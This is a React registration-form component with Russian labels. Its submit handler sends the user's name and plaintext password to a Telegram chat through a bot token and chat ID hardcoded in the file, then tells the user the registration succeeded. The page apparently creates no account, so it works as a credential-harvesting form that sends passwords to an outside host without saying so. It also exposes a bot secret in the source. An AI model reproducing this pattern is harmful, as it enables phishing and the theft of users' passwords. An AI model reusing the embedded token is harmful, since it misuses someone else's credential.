import React, { useState } from 'react';
import s from './Join.module.scss';
import { useNavigate } from 'react-router-dom';

const Join = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const navigate = useNavigate()

  const TOKEN = '7683373660:AAHmp2XIMIe9dq5ol4sxCcZFtgJwTmrA1KQ';
  const CHAT_ID = '-4708168733';

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!username.trim()) {
      alert('Введите имя пользователя');
      return;
    }

    if (password !== confirmPassword) {
      alert('Пароли не совпадают');
      return;
    }

    const message = `👤 Новая регистрация:\nИмя пользователя: ${username}\nПароль: ${password}`;

    try {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      });
      alert('✅ Вы успешно прошли регистрацию!');
      setUsername('');
      setPassword('');
      setConfirmPassword('');
    } catch (error) {
      alert('Ошибка при отправке данных в Telegram');
      console.error('Ошибка:', error);
    }
  };

  function HomeButton() {
    if(password == confirmPassword) {
      setTimeout(() => {
        navigate("/");
      }, 3000); 
    }
  }

  return (
    <div className={s.joinContainer}>
      {/* <img src="https://i.gifer.com/origin/38/38e41eb81a16b877dbb3128438b457c4_w200.gif" alt="" /> */}
      <div className={s.email}>
      <h2 className={s.dag}>Регистрация</h2>
      <form onSubmit={handleSubmit} className={s.form}>
        <label>
          Имя пользователя:
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Введите имя"
            required
          />
        </label>

        <label>
          Пароль:
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Введите пароль"
            required
          />
        </label>

        <label>
          Подтвердите пароль:
          <input
            type="password"
            value={confirmPassword}
            onChange={(e) => setConfirmPassword(e.target.value)}
            placeholder="Повторите пароль"
            required
          />
        </label>

        <button className={s.bug} onClick={HomeButton} type="submit">Зарегистрироваться</button>
      </form>
      </div>
      {/* <img className={s.mimi} src="https://i.gifer.com/origin/38/38e41eb81a16b877dbb3128438b457c4_w200.gif" alt="" /> */}
    </div>
  );
};

export default Join;
